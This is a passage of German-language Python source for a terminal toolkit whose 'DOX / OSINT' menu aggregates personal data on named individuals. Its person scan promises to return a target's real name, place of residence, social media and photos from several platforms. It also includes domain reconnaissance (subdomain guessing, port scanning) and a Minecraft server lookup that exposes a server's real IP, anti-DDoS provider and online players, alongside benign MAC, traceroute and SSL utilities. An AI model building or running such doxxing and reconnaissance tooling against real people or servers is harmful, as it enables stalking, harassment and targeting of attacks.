        ("Google Lens", f"https://lens.google.com/uploadbyurl?url={enc}"),
        ("Yandex",      f"https://yandex.com/images/search?url={enc}&rpt=imageview"),
        ("TinEye",      f"https://tineye.com/search?url={enc}"),
        ("Bing Visual", f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}"),
    ]
    for label, link in links:
        print(f"  {G}→ {label:<16} {link}{R}")

def dox_domain():
    hdr("DOMAIN KOMPLETT-DOX")
    dom  = inp("Domain")
    host = re.sub(r"https?://","",dom).split("/")[0].strip()
    print(f"\n  {YG}── IP & Geo ──{R}")
    try:
        ip = socket.gethostbyname(host)
        d  = getj(f"http://ip-api.com/json/{ip}?fields=66846719")
        row("IP",    d.get("query","?"))
        row("Land",  d.get("country","?"))
        row("Stadt", d.get("city","?"))
        row("ISP",   d.get("isp","?"))
        row("Org",   d.get("org","?"))
        row("Proxy", "JA ⚠" if d.get("proxy") else "Nein")
        lat, lon = d.get("lat",""), d.get("lon","")
        if lat: print(f"\n  {DG}Maps{R}  {G}https://maps.google.com/?q={lat},{lon}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")

    print(f"\n  {YG}── Subdomains ──{R}")
    for sub in ["www","mail","admin","api","dev","ftp","smtp","vpn","app","staging"]:
        try:
            ip2 = socket.gethostbyname(f"{sub}.{host}")
            print(f"  {G}[+] {sub}.{host} → {ip2}{R}")
        except: pass

    print(f"\n  {YG}── Offene Ports ──{R}")
    for p in [21,22,25,53,80,110,443,3306,3389,8080,8443]:
        try:
            s = socket.socket(); s.settimeout(0.6)
            if s.connect_ex((host,p))==0:
                try:    svc = socket.getservbyport(p)
                except: svc = "?"
                print(f"  {G}[OPEN] {p:<6} {svc}{R}")
            s.close()
        except: pass

    print(f"\n  {YG}── HTTP-Header ──{R}")
    for scheme in ("https","http"):
        try:
            _, status, h = get(f"{scheme}://{host}", timeout=8)
            row("Status", str(status))
            for k in ("Server","X-Powered-By","Content-Type","X-Frame-Options","Strict-Transport-Security"):
                if k in h: row(k, h[k][:70])
            break
        except: pass

def _news_rss(query):
    """Holt echte News-Schlagzeilen aus Google News RSS."""
    items = []
    try:
        url  = f"https://news.google.com/rss/search?q={urllib.parse.quote(query)}&hl=de&gl=DE&ceid=DE:de"
        body, _, _ = get(url, timeout=8)
        titles = re.findall(r'<title><!\[CDATA\[(.*?)\]\]></title>', body)
        dates  = re.findall(r'<pubDate>(.*?)</pubDate>', body)
        sources= re.findall(r'<source[^>]*>(.*?)</source>', body)
        for i in range(min(5, len(titles))):
            t = titles[i] if i < len(titles) else "?"
            d = dates[i][:16]  if i < len(dates)   else "?"
            s = sources[i]     if i < len(sources)  else "?"
            if t and t != query:
                items.append((t, s, d))
    except: pass
    return items

def _twitter_check(name):
    """Prüft ob Twitter/X-Profil existiert."""
    try:
        body, status, _ = get(f"https://twitter.com/{urllib.parse.quote(name)}", timeout=7)
        if status == 200 and "this account doesn't exist" not in body.lower():
            bio   = ""
            m = re.search(r'"description":"([^"]{5,}?)"', body)
            if m: bio = m.group(1)[:60]
            loc_m = re.search(r'"location":"([^"]+?)"', body)
            loc   = loc_m.group(1) if loc_m else ""
            return True, bio, loc
    except: pass
    return False, "", ""

def dox_person_scan():
    RED = "[91m"; BRED = "[1;91m"
    hdr("★ PERSONEN-SCAN  (IRL)")
    print(f"  {DG}Gibt echten Namen, Wohnort, Social-Media, News, Fotos zurück.{R}")
    print(f"  {DG}Funktioniert am besten mit Vor- und Nachname.{R}\n")
    name = inp("Vor- und Nachname")
    div()
    if not name: print(f"  {G}[!] Name eingeben.{R}"); wait(); return

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    def sec(title): print(M); print(L(f"{YG}── {title} ──{R}"))

    enc  = urllib.parse.quote(f'"{name}"')
    encp = urllib.parse.quote(name)

    print(f"  {DG}Scanne ...{R}\n")

    # ── GITHUB (nach echtem Namen suchen) ───────────────────────
    print(f"  {DG}[ 1/6 ] GitHub Namenssuche ...{R}", end="", flush=True)
    gh_users = []
    try:
        r = getj(f"https://api.github.com/search/users?q={urllib.parse.quote(name)}+in:name&per_page=3")
        for u in r.get("items", []):
            try:
                detail = getj(f"https://api.github.com/users/{u['login']}")
                if not detail.get("message"):
                    gh_users.append(detail)
            except: pass
    except: pass
    print(f" {G}{len(gh_users)} Treffer{R}")

    # ── REDDIT Suche ────────────────────────────────────────────
    print(f"  {DG}[ 2/6 ] Reddit Suche ...{R}", end="", flush=True)
    rd_results = []
    try:
        r = getj(f"https://www.reddit.com/search.json?q={urllib.parse.quote(name)}&type=user&limit=3",
                 headers={"User-Agent":"Mozilla/5.0"})
        rd_results = r.get("data",{}).get("children",[])
    except: pass
    print(f" {G}{len(rd_results)} Treffer{R}")

    # ── TWITTER/X ───────────────────────────────────────────────
    tw_ok, tw_bio, tw_loc = False, "", ""
    tw_name_clean = name.replace(" ","")
    if len(tw_name_clean) <= 15:
        print(f"  {DG}[ 3/6 ] Twitter/X ...{R}", end="", flush=True)
        tw_ok, tw_bio, tw_loc = _twitter_check(tw_name_clean)
        print(f" {G}{'GEFUNDEN' if tw_ok else '—'}{R}")
    else:
        print(f"  {DG}[ 3/6 ] Twitter/X ...{R} {DG}(Name zu lang für Direkt-Check){R}")

    # ── GOOGLE NEWS RSS ─────────────────────────────────────────
    print(f"  {DG}[ 4/6 ] News-Erwähnungen ...{R}", end="", flush=True)
    news = _news_rss(name)
    print(f" {G}{len(news)} Artikel{R}")

    # ── WIKIPEDIA ───────────────────────────────────────────────
    print(f"  {DG}[ 5/6 ] Wikipedia ...{R}", end="", flush=True)
    wiki = {}
    try:
        r = getj(f"https://de.wikipedia.org/api/rest_v1/page/summary/{urllib.parse.quote(name)}")
        if r.get("type") == "standard" and r.get("title"):
            wiki = r
        else:
            r2 = getj(f"https://en.wikipedia.org/api/rest_v1/page/summary/{urllib.parse.quote(name)}")
            if r2.get("type") == "standard":
                wiki = r2
    except: pass
    print(f" {G}{'GEFUNDEN' if wiki else '—'}{R}")

    # ── WIKIDATA ────────────────────────────────────────────────
    print(f"  {DG}[ 6/6 ] Wikidata ...{R}", end="", flush=True)
    wikidata = {}
    try:
        r = getj(f"https://www.wikidata.org/w/api.php?action=wbsearchentities&search={urllib.parse.quote(name)}&language=de&format=json&limit=1")
        hits = r.get("search", [])
        if hits:
            wikidata = hits[0]
    except: pass
    print(f" {G}{'GEFUNDEN' if wikidata else '—'}{R}")

    # ── AUSGABE ─────────────────────────────────────────────────
    print()
    print(T)
    print(L(f"{YG}⬡ PERSONEN-SCAN  {DG}│  {G}{name}{R}"))
    found_any = False

    if wiki:
        found_any = True
        sec("WIKIPEDIA")
        desc = wiki.get("description","")
        extr = wiki.get("extract","")
        url  = wiki.get("content_urls",{}).get("desktop",{}).get("page","")
        if desc: print(L(f"  {DG}Beschr.       {R}{G}{desc[:55]}{R}"))
        if extr:
            for i in range(0, min(len(extr), 170), 56):
                print(L(f"  {G}{extr[i:i+56]}{R}"))
        if url:  print(L(f"  {DG}Wikipedia     {R}{G}{url[:55]}{R}"))
        if wikidata.get("id"):
            print(L(f"  {DG}Wikidata-ID   {R}{G}{wikidata['id']}{R}"))

    if news:
        found_any = True
        sec(f"NEWS-ERWÄHNUNGEN  ({len(news)} Artikel)")
        for title, source, date in news:
            print(L(f"  {G}{title[:54]}{R}"))
            print(L(f"  {DG}{source:<22} {date}{R}"))

    if gh_users:
        found_any = True
        sec(f"GITHUB  ({len(gh_users)} Treffer)")
        for u in gh_users:
            print(L(f"  {G}{u.get('login','?'):<22}{R} {DG}{u.get('name','')}{R}"))
            if u.get("bio"):      print(L(f"  {DG}Bio:   {u['bio'][:50]}{R}"))
            if u.get("location"): print(L(f"  {DG}Ort:   {u['location']}{R}"))
            if u.get("company"):  print(L(f"  {DG}Firma: {u['company']}{R}"))
            if u.get("blog"):     print(L(f"  {DG}Blog:  {u['blog'][:50]}{R}"))
            print(L(f"  {DG}→ {u.get('html_url','')}{R}"))

    if tw_ok:
        found_any = True
        sec("TWITTER / X")
        print(L(f"  {G}@{tw_name_clean}{R}"))
        if tw_bio: print(L(f"  {DG}Bio: {tw_bio[:52]}{R}"))
        if tw_loc: print(L(f"  {DG}Ort: {tw_loc}{R}"))
        print(L(f"  {DG}→ https://twitter.com/{tw_name_clean}{R}"))

    if rd_results:
        found_any = True
        sec(f"REDDIT  ({len(rd_results)} Treffer)")
        for c in rd_results[:3]:
            d = c.get("data",{})
            n = d.get("name","?")
            print(L(f"  {G}{n}{R}  {DG}→ https://reddit.com/user/{n}{R}"))

    sec("SUCHLINKS (im Browser öffnen)")
    links = [
        ("Google",      f"https://www.google.com/search?q=%22{urllib.parse.quote(name)}%22"),
        ("Bilder",      f"https://www.google.com/search?q=%22{urllib.parse.quote(name)}%22&tbm=isch"),
        ("Facebook",    f"https://www.facebook.com/search/people/?q={encp}"),
        ("Instagram",   f"https://www.instagram.com/explore/search/keyword/?q={encp}"),
        ("LinkedIn",    f"https://www.linkedin.com/search/results/people/?keywords={encp}"),
        ("Twitter/X",   f"https://twitter.com/search?q=%22{encp}%22&f=user"),
        ("TikTok",      f"https://www.tiktok.com/search?q={encp}"),
        ("Snapchat",    f"https://www.snapchat.com/add/{urllib.parse.quote(name.replace(' ',''))}"),
        ("Telegram",    f"https://t.me/{urllib.parse.quote(name.replace(' ',''))}"),
        ("Google News", f"https://news.google.com/search?q=%22{urllib.parse.quote(name)}%22"),
        ("YouTube",     f"https://www.youtube.com/results?search_query=%22{encp}%22"),
        ("Bing",        f"https://www.bing.com/search?q=%22{urllib.parse.quote(name)}%22"),
    ]
    for label, url in links:
        print(L(f"  {DG}{label:<14}{R} {G}{url[:50]}{R}"))

    if not found_any:
        print(M)
        print(L(f"  {DG}Keine Auto-Treffer — Suchlinks oben im Browser öffnen.{R}"))

    print(B)
    wait()


def dox_lookup():
    fns = {
        "1": ("USERNAME OSINT",    "40+ Plattformen  GitHub Reddit Steam Discord",  dox_username),
        "2": ("IP OSINT",          "Geo  VPN  Tor  ISP  Maps  ASN",                dox_ip),
        "3": ("E-MAIL OSINT",      "Domain  Breaches  Gravatar  Profil-Links",      dox_email),
        "4": ("TELEFON OSINT",     "Land  Carrier  Typ  Suchlinks",                 dox_phone),
        "5": ("NAME / GAMERTAG",   "Google  Social  Gaming  Discord  News",         dox_name),
        "6": ("FOTO REVERSE",      "Google  Yandex  TinEye  Bing",                  dox_foto),
        "7": ("DOMAIN DOX",        "IP  Ports  Subdomains  Header  SSL  WHOIS",     dox_domain),
        "8": ("PERSONEN-SCAN",     "GitHub  Reddit  Twitter  Wikipedia  News",       dox_person_scan),
    }
    while True:
        hdr("DOX / OSINT")
        print(f"  {DG}╔{'═'*66}╗{R}")
        print(f"  {DG}║{R}  {YG}SELECT MODULE{DG}{'─'*52}║{R}")
        print(f"  {DG}╠{'═'*66}╣{R}")
        for k, (name, desc, _) in fns.items():
            print(f"  {DG}║{R}  {DG}[{G}{k}{DG}]{R}  {YG}{name:<22}{R}  {DG}{desc:<37}{DG}║{R}")
        print(f"  {DG}╠{'═'*66}╣{R}")
        print(f"  {DG}║{R}  {DG}[{G}0{DG}]{R}  {DIM}← zurück{R}{' '*55}{DG}║{R}")
        print(f"  {DG}╚{'═'*66}╝{R}\n")
        m = input(f"  {DG}┌─[{G}SELECT{DG}]──►{R} ").strip()
        if m == "0": break
        if m in fns:
            fns[m][2]()
        else:
            print(f"  {DG}[{G}!{DG}]{R} {G}Ungültige Auswahl.{R}")
            time.sleep(0.5)

# ── 22  MINECRAFT SERVER LOOKUP ──────────────────────────────

def _varint_w(v):
    o = b""
    while True:
        b = v & 0x7F; v >>= 7
        if v: b |= 0x80
        o += bytes([b])
        if not v: return o

def _varint_r(s):
    v = 0; sh = 0
    while True:
        b = s.recv(1)
        if not b: raise ConnectionError("disconnect")
        byte = b[0]; v |= (byte & 0x7F) << sh
        if not (byte & 0x80): return v
        sh += 7

def _mc_ping(host, port):
    s = socket.socket(); s.settimeout(5); s.connect((host, port))
    hb  = host.encode()
    # Probiere Protokoll 760 (1.19+) und 47 (1.8) für maximale Kompatibilität
    for proto in [760, 47]:
        try:
            s2 = socket.socket(); s2.settimeout(5); s2.connect((host, port))
            pkt = b"\x00" + _varint_w(proto) + _varint_w(len(hb)) + hb + port.to_bytes(2,"big") + b"\x01"
            s2.sendall(_varint_w(len(pkt)) + pkt + b"\x01\x00")
            _varint_r(s2); _varint_r(s2)
            jlen = _varint_r(s2); data = b""
            while len(data) < jlen:
                c = s2.recv(min(4096, jlen-len(data)))
                if not c: break
                data += c
            s2.close()
            return json.loads(data.decode())
        except: pass
    raise ConnectionError("Kein MC-Server")

def _motd_clean(desc):
    if isinstance(desc, dict):
        t = desc.get("text","")
        for ex in desc.get("extra",[]):
            t += ex.get("text","") if isinstance(ex,dict) else str(ex)
    else:
        t = str(desc)
    return re.sub(r"§.", "", t).strip()

ANSI_RE = re.compile(r'\x1B\[[0-9;]*m')
def _vis(s):
    return len(ANSI_RE.sub("", s))

def _mc_box_line(content, W):
    pad = W - _vis(content)
    return f"  {DG}║{R} {content}{' '*max(pad-1,0)}{DG}║{R}"

def _detect_software(version_str, forge_mods=None, plugins=None):
    v = version_str.lower()
    if forge_mods and len(forge_mods) > 0: return f"Forge ({len(forge_mods)} Mods)"
    if plugins    and len(plugins)    > 0: return f"Paper/Spigot ({len(plugins)} Plugins)"
    if "paper"       in v: return "Paper"
    if "purpur"      in v: return "Purpur"
    if "pufferfish"  in v: return "Pufferfish"
    if "spigot"      in v: return "Spigot"
    if "craftbukkit" in v: return "CraftBukkit"
    if "velocity"    in v: return "Velocity (Proxy)"
    if "bungeecord"  in v: return "BungeeCord (Proxy)"
    if "waterfall"   in v: return "Waterfall (Proxy)"
    if "flamecord"   in v: return "FlameCord (Proxy)"
    if "fabric"      in v: return "Fabric"
    if "quilt"       in v: return "Quilt"
    if "sponge"      in v: return "Sponge"
    if "folia"       in v: return "Folia"
    if "vanilla"     in v: return "Vanilla"
    return "Vanilla / Unbekannt"

def _favicon_ascii(favicon_b64):
    if not favicon_b64: return []
    try:
        data = base64.b64decode(favicon_b64.split(",")[-1])
        # PNG signature check
        if data[:8] != b'\x89PNG\r\n\x1a\n': return []
        # Find IHDR chunk
        w = int.from_bytes(data[16:20], 'big')
        h = int.from_bytes(data[20:24], 'big')
        return [f"  {DG}Icon: {w}×{h}px (PNG){R}"]
    except:
        return []

def _online_mode_detect(raw_data):
    # If server sends enforce-secure-profile or has specific protocol markers
    desc = str(raw_data.get("description","")).lower()
    ver  = str(raw_data.get("version",{}).get("name","")).lower() if isinstance(raw_data.get("version"),dict) else ""
    if "cracked" in desc or "offline" in desc or "crack" in ver:
        return "Cracked (Offline-Mode)"
    if "premium" in desc or "online" in desc:
        return "Premium (Online-Mode)"
    return "Unbekannt"

def _detect_antiddos(ip, isp):
    i = isp.lower()
    tcpshield_ranges = ["198.244.","141.95.","51.89.","54.39."]
    if any(ip.startswith(r) for r in tcpshield_ranges): return "TCPShield"
    if "cloudflare" in i:  return "Cloudflare"
    if "tcpshield"  in i:  return "TCPShield"
    if "neoprotect" in i:  return "NeoProtect"
    if "ovh"        in i:  return "OVH"
    if "hetzner"    in i:  return "Hetzner"
    if "nitrado"    in i:  return "Nitrado"
    if "apex"       in i:  return "Apex Hosting"
    if "aternos"    in i:  return "Aternos (Free)"
    if "minehut"    in i:  return "Minehut (Free)"
    return None

def _check_webmap(host):
    found = []
    for name, port_w, path in [
        ("Dynmap",   8123, "/"),
        ("BlueMap",  8100, "/"),
        ("Pl3xMap",  8080, "/tiles/"),
        ("Squaremap",8080, "/"),
    ]:
        try:
            s = socket.socket(); s.settimeout(2)
            if s.connect_ex((host, port_w)) == 0:
                found.append(f"{name} (:{port_w})")
            s.close()
        except: pass
    return found

def _mc_ping_multi(host, port, count=3):
    lats = []
    for _ in range(count):
        try:
            t0 = time.time()
            _mc_ping(host, port)
            lats.append(int((time.time()-t0)*1000))
        except: pass
    return lats

def _srv_lookup(host):
    try:
        # Manual DNS SRV query via Google DNS-over-HTTPS
        url = f"https://dns.google/resolve?name=_minecraft._tcp.{host}&type=SRV"
        d   = getj(url, timeout=5)
        ans = d.get("Answer",[])
        for a in ans:
            data = a.get("data","")
            parts = data.split()
            if len(parts) == 4:
                srv_port   = int(parts[2])
                srv_target = parts[3].rstrip(".")
                return srv_target, srv_port
    except: pass
    return None, None

def mc_lookup():
    hdr("MINECRAFT SERVER LOOKUP")
    addr = inp("Server-Adresse (z.B. hypixel.net oder 1.2.3.4:25565)").strip()
    if ":" in addr: host, port = addr.rsplit(":",1); port = int(port)
    else:           host, port = addr, 25565

    div()
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]

    def spin(msg, steps=10):
        for i in range(steps):
            print(f"\r  {G}{frames[i%len(frames)]}{R} {DG}{msg}{R}", end="", flush=True)
            time.sleep(0.07)
        print(f"\r  {G}✔{R} {DG}{msg}{R}          ")

    # ── SRV Record ──────────────────────────────────────────
    spin("SRV-Record prüfen ...")
    srv_host, srv_port = _srv_lookup(host)
    real_host = srv_host if srv_host else host
    real_port = srv_port if srv_port else port
    srv_info  = f"{srv_host}:{srv_port}" if srv_host and srv_host != host else None

    # ── API zuerst (schneller & zuverlässiger) ──────────────
    api_data = None
    spin("API-Daten abrufen ...")
    try:
        api_data = getj(f"https://api.mcsrvstat.us/3/{real_host}:{real_port}", timeout=10)
    except: pass

    raw = None; src = ""; lats = []

    if api_data and api_data.get("online"):
        mc  = api_data.get("motd",{}).get("clean",[])
        pl  = api_data.get("players",{})
        raw = {
            "description": " ".join(mc).strip(),
            "players": {"online":pl.get("online",0),"max":pl.get("max",0),
                        "sample":[{"name":n} for n in (pl.get("list") or [])]},
            "version": {"name": api_data.get("version","?"), "protocol": api_data.get("protocol","?")},
        }
        src = "API (mcsrvstat.us)"

    # ── Direkter Ping für Latenz ─────────────────────────────
    spin(f"Direkt-Ping {real_host}:{real_port} ...")
    try:
        import threading as _thr
        result = [None]
        def _do_ping():
            try: result[0] = _mc_ping_multi(real_host, real_port, 3)
            except: pass
        t = _thr.Thread(target=_do_ping, daemon=True); t.start(); t.join(timeout=6)
        lats = result[0] or []
        if lats and not raw:
            raw = _mc_ping(real_host, real_port); src = "Direkt (Java)"
    except: pass

    # ── Bedrock Check ────────────────────────────────────────
    spin("Bedrock-Port prüfen ...")
    bedrock_online = False
    try:
        bd = getj(f"https://api.mcsrvstat.us/bedrock/3/{real_host}", timeout=8)
        bedrock_online = bd.get("online", False)
    except: pass

    # ── Geo ──────────────────────────────────────────────────
    spin("Geo & Netzwerk-Info ...")
    geo = {"city":"?","country":"?","isp":"?","org":"?","query":real_host,"as":"?"}
    real_ip = real_host
    try:
        real_ip = socket.gethostbyname(real_host)
        geo = getj(f"http://ip-api.com/json/{real_ip}?fields=country,countryCode,city,isp,org,as,query,proxy,hosting")
    except: pass

    # ── Web-Map Check ────────────────────────────────────────
    spin("Web-Karte prüfen ...")
    webmaps = _check_webmap(real_host)

    # ── Extra Port Scan ──────────────────────────────────────
    spin("MC-Ports scannen ...")
    mc_ports = {}
    for p in [25565, 25566, 25567, 19132, 19133, 8123, 8100, 8080]:
        try:
            s = socket.socket(); s.settimeout(0.7)
            mc_ports[p] = (s.connect_ex((real_host, p)) == 0)
            s.close()
        except: mc_ports[p] = False

    # ── Whitelist / Plugins via API ──────────────────────────
    plugins   = []
    mods      = []
    whitelist = False
    if api_data:
        plugins   = api_data.get("plugins",{}).get("names",[]) or []
        mods      = api_data.get("mods",{}).get("names",[])    or []
        whitelist = api_data.get("info",{}).get("raw",[]) != []

    # ════════════════════════════════════════════════════════
    #  AUSGABE
    # ════════════════════════════════════════════════════════
    clear()
    hdr("MINECRAFT SERVER LOOKUP")

    if not raw:
        W = 50
        print(f"\n  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}  {G}✖  SERVER OFFLINE ODER NICHT ERREICHBAR{R}{'  '}{DG}║{R}")
        print(f"  {DG}║{R}  {DG}{real_host}:{real_port}{R}{' '*(W-len(real_host)-len(str(real_port))-3)}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}")
        wait(); return

    motd    = _motd_clean(raw.get("description",""))
    pl      = raw.get("players",{})
    online  = pl.get("online","?")
    maximum = pl.get("max","?")
    sample  = pl.get("sample",[]) or []
    ver     = raw.get("version",{})
    version = ver.get("name","?") if isinstance(ver,dict) else str(ver)
    proto   = ver.get("protocol","?") if isinstance(ver,dict) else "?"

    software   = _detect_software(version, mods or None, plugins or None)
    online_mode= _online_mode_detect(raw)
    antiddos   = _detect_antiddos(real_ip, geo.get("isp",""))
    isp        = geo.get("isp","?")
    city       = geo.get("city","?")
    country    = geo.get("country","?")
    cc         = geo.get("countryCode","")
    as_num     = geo.get("as","?")
    is_hosting = geo.get("hosting", False)

    lat_min = min(lats) if lats else None
    lat_max = max(lats) if lats else None
    lat_avg = int(sum(lats)/len(lats)) if lats else None

    def lat_col(ms):
        if ms is None: return f"{DG}—{R}"
        if ms < 50:    return f"{G}{ms}ms ⚡{R}"
        if ms < 120:   return f"{G}{ms}ms{R}"
        if ms < 250:   return f"{YG}{ms}ms ⚠{R}"
        return         f"{G}{ms}ms ✖{R}"

    pct = (online/maximum*100) if isinstance(online,int) and isinstance(maximum,int) and maximum>0 else 0
    if   not isinstance(online,int) or online==0: status = f"{DG}LEER{R}"
    elif pct < 50:  status = f"{G}AKTIV{R}"
    elif pct < 85:  status = f"{YG}VOLL{R}"
    else:           status = f"{G}ÜBERFÜLLT{R}"

    W = 64
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _mc_box_line(c, W)

    # Player bar
    fb = int(32 * online / max(maximum,1)) if isinstance(online,int) and isinstance(maximum,int) else 0
    pbar = f"{G}{'█'*fb}{'░'*(32-fb)}{R}"

    print()
    print(T)
    print(L(f"{YG}⬡ MINECRAFT  {DG}│  {G}{real_host}:{real_port}  {DG}│  {R}{status}"))
    print(M)
    print(L(f"{DG}MOTD       {R}{G}{motd[:52] or '(leer)'}{R}"))
    print(L(f"{DG}VERSION    {R}{G}{version[:30]}{R}"))
    print(L(f"{DG}SOFTWARE   {R}{G}{software}{R}"))
    print(L(f"{DG}PROTOKOLL  {R}{G}{proto}{R}"))
    print(L(f"{DG}AUTH-MODE  {R}{G}{online_mode}{R}"))
    print(M)
    print(L(f"{DG}SPIELER    {R}[{pbar}] {YG}{online}/{maximum}{R}"))
    if lats:
        print(L(f"{DG}LATENZ     {R}avg {lat_col(lat_avg)}  min {lat_col(lat_min)}  max {lat_col(lat_max)}"))
    print(M)
    print(L(f"{DG}IP         {R}{G}{real_ip}{R}"))
    if srv_info:
        print(L(f"{DG}SRV        {R}{G}{srv_info}{R}"))
    print(L(f"{DG}STANDORT   {R}{G}{city}, {country} {cc}{R}"))
    print(L(f"{DG}ISP/HOSTER {R}{G}{isp[:45]}{R}"))
    print(L(f"{DG}AS-Nummer  {R}{G}{as_num}{R}"))
    if antiddos:
        print(L(f"{DG}ANTI-DDoS  {R}{YG}{antiddos}{R}"))
    if is_hosting:
        print(L(f"{DG}HOSTING    {R}{G}Dedizierter Server / Rechenzentrum{R}"))
    print(M)
    print(L(f"{DG}JAVA       {R}{G}{'✔ Online' if raw else '✖ Offline'}{R}   {DG}BEDROCK  {R}{G}{'✔ Online' if bedrock_online else '✖ Offline'}{R}"))

    # Offene MC-Ports
    open_ports = [str(p) for p,v in mc_ports.items() if v and p not in (8123,8100,8080)]
    if open_ports:
        print(L(f"{DG}MC-PORTS   {R}{G}{', '.join(open_ports)}{R}"))

    # Web-Maps
    if webmaps:
        print(L(f"{DG}WEB-MAP    {R}{G}{', '.join(webmaps)}{R}"))

    print(B)

    # Plugins
    if plugins:
        print(f"\n  {YG}┌─ Plugins ({len(plugins)}) {'─'*35}┐{R}")
        for i in range(0, min(len(plugins),30), 3):
            chunk = plugins[i:i+3]
            line  = "   ".join(f"{G}{p:<22}{R}" for p in chunk)
            print(f"  {YG}│{R}  {line}")
        if len(plugins)>30: print(f"  {YG}│{R}  {DG}+{len(plugins)-30} weitere{R}")
        print(f"  {YG}└{'─'*42}┘{R}")

    # Mods
    if mods:
        print(f"\n  {YG}┌─ Mods ({len(mods)}) {'─'*38}┐{R}")
        for i in range(0, min(len(mods),30), 3):
            chunk = mods[i:i+3]
            line  = "   ".join(f"{G}{m:<22}{R}" for m in chunk)
            print(f"  {YG}│{R}  {line}")
        if len(mods)>30: print(f"  {YG}│{R}  {DG}+{len(mods)-30} weitere{R}")
        print(f"  {YG}└{'─'*42}┘{R}")

    # Online-Spieler
    if sample:
        print(f"\n  {YG}┌─ Online-Spieler ({len(sample)}) {'─'*30}┐{R}")
        names = [p.get("name","?") if isinstance(p,dict) else str(p) for p in sample[:24]]
        for i in range(0, len(names), 3):
            chunk = names[i:i+3]
            line  = "  ".join(f"{G}• {n:<20}{R}" for n in chunk)
            print(f"  {YG}│{R}  {line}")
        if len(sample)>24: print(f"  {YG}│{R}  {DG}... und {len(sample)-24} weitere{R}")
        print(f"  {YG}└{'─'*42}┘{R}")

    # Favicon Info
    favicon_info = _favicon_ascii(raw.get("favicon",""))
    if favicon_info:
        for fi in favicon_info: print(fi)

    lat_str = geo.get("lat",""); lon_str = geo.get("lon","")
    if lat_str:
        print(f"\n  {DG}Maps   {R}{G}https://maps.google.com/?q={lat_str},{lon_str}{R}")
    print(f"  {DG}Quelle {R}{G}{src}{R}")
    wait()

# ── 23  MAC LOOKUP ───────────────────────────────────────────
def mac_lookup():
    hdr("MAC LOOKUP")
    mac=inp("MAC-Adresse (z.B. 00:1A:2B:3C:4D:5E)")
    div()
    clean=re.sub(r"[^0-9A-Fa-f]","",mac).upper()
    if len(clean)<6:
        print(f"  {G}[!] Ungültige MAC{R}"); wait(); return
    prefix=clean[:6]
    fmt=":".join(clean[i:i+2] for i in range(0,min(len(clean),12),2))
    row("MAC",    fmt)
    row("Prefix", prefix)
    try:
        req=urllib.request.Request(
            f"https://api.macvendors.com/{prefix}",
            headers={"User-Agent":"open-vs","Accept":"text/plain"})
        with urllib.request.urlopen(req,timeout=8) as r:
            row("Hersteller", r.read().decode().strip())
    except urllib.error.HTTPError as e:
        msg={404:"Kein Hersteller gefunden",429:"Rate-Limit – bitte warten"}.get(e.code,f"HTTP {e.code}")
        print(f"  {G}[!] {msg}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 24  TRACEROUTE ───────────────────────────────────────────
def traceroute():
    hdr("TRACEROUTE")
    host=inp("Host / IP")
    div()
    print(f"  {DG}Traceroute zu {host} (kann bis zu 60s dauern) ...{R}\n")
    try:
        if os.name=="nt":
            cmd=["powershell","-NoProfile","-Command",
                 f"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; tracert -d -w 1500 {host}"]
        else:
            cmd=["traceroute","-n","-w","2",host]
        proc=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        for raw in proc.stdout:
            line=raw.decode("utf-8",errors="ignore").rstrip()
            s=line.strip()
            if not s or "OutputEncoding" in s or "chcp" in s.lower(): continue
            ips=re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b',s)
            print(f"  {G}{s}{R}",end="")
            pub=[i for i in ips if not re.match(r'^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)',i)]
            if pub:
                try:
                    geo=getj(f"http://ip-api.com/json/{pub[0]}?fields=country,city",timeout=3)
                    city,country=geo.get("city",""),geo.get("country","")
                    if country: print(f"  {DG}← {city+', ' if city else ''}{country}{R}",end="")
                except: pass
            print()
        proc.wait()
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 25  SSL CHECKER ──────────────────────────────────────────
def ssl_checker():
    hdr("SSL ZERTIFIKAT CHECKER")
    host=re.sub(r"https?://","",inp("Domain")).split("/")[0].strip()
    div()
    try:
        ctx=ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((host,443),timeout=8),
                             server_hostname=host) as s:
            cert=s.getpeercert()
        subject=dict(x[0] for x in cert.get("subject",[]))
        issuer =dict(x[0] for x in cert.get("issuer",[]))
        san    =[v for t,v in cert.get("subjectAltName",[]) if t=="DNS"]
        na     =cert.get("notAfter","?")
        nb     =cert.get("notBefore","?")
        try:
            exp=datetime.strptime(na,"%b %d %H:%M:%S %Y %Z")
            days=(exp-datetime.utcnow()).days
            exp_str=f"{exp.strftime('%Y-%m-%d')}  ({days} Tage)"
            if days<30: exp_str+=f"  {G}⚠ LÄUFT BALD AB{R}"
        except:
            exp_str=na
        row("Domain",        host)
        row("Ausgestellt für",subject.get("commonName","?"))
        row("Aussteller",    issuer.get("organizationName","?"))
        row("Gültig ab",     nb)
        print(f"  {DG}{'Gültig bis':<20}{R} {YG}{exp_str}{R}")
        if san:
            row("Alt-Namen", ", ".join(san[:6])+(f" +{len(san)-6}" if len(san)>6 else ""))
    except ssl.SSLCertVerificationError as e:
        print(f"  {G}[✗] Zertifikat ungültig: {e}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 26  GITHUB USER LOOKUP ───────────────────────────────────
def github_lookup():
    hdr("GITHUB USER LOOKUP")
    uname=inp("GitHub-Username")
    div()
    try:
        u=getj(f"https://api.github.com/users/{uname}")
        if u.get("message")=="Not Found":
            print(f"  {G}[✗] User nicht gefunden{R}"); wait(); return
        row("Name",        u.get("name") or "—")
